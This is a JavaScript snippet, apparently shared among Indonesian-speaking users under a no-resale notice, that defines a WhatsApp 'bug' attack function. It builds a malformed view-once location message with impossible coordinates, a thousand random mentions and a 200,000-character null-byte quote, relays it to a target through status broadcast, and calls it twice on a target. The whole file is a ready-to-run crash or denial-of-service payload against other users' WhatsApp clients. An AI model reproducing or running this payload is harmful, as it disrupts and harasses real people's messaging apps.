*/RULES :
JANGAN JUAL ATAU SHARE KE PT KALIAN!! 
PT DILARANG JUAL & SHARE SECARA FREE!!! 

OWNER VIP BOLEH JUAL & SHARE KE PT ( TAPI NGOTAK ) 
KALO PARTNER SAMPE KATAHUAN MAKA KENA SANKSI ATAU BL!!
@ OmOsaka2Real
*/

async function TheHardXyz(target, jumlah = 1000, mention) {
  let mentionAi = (jumlah) => {
    return [
      "0@s.whatsapp.net",
      ...Array.from({ length: jumlah }, () =>
        "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
      )
    ]
  }
  
  let aiMentions = mentionAi(jumlah)
  let msgContent = {
    viewOnceMessage: {
      message: {
        locationMessage: {
          degreesLatitude: -999.4771901,
          degreesLongitude: 999.4771901,
          name: "xnxx",
          address: "null",
          contextInfo: {
            stanzaId: "A53737D6CE47253579FA0A0CA9A94F1C",
            participant: target,
            mentionedJid: aiMentions,
            quotedMessage: {
              conversation: "\u0000".repeat(200000)
            }
          }
        }
      }
    }
  }

  const Msg = await generateWAMessageFromContent(target, msgContent, {})

 await jwmbood.relayMessage("status@broadcast", Msg.message, {
        messageId: Msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
    
  if (mention) {
    await jwmbood.relayMessage(
      target,
      {
        statusMentionMessage: {
          message: {
            protocolMessage: {
              key: Msg.key,
              type: 25
            }
          }
        }
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: "The - Hard - Xyz By OmOsaka2Real" },
            content: undefined
          }
        ]
      }
    )
  }
    
  console.log("succes send bug")
}

// Pemanggilan 
await TheHardXyz(target, 1000, true)
await TheHardXyz(target, 1000, false)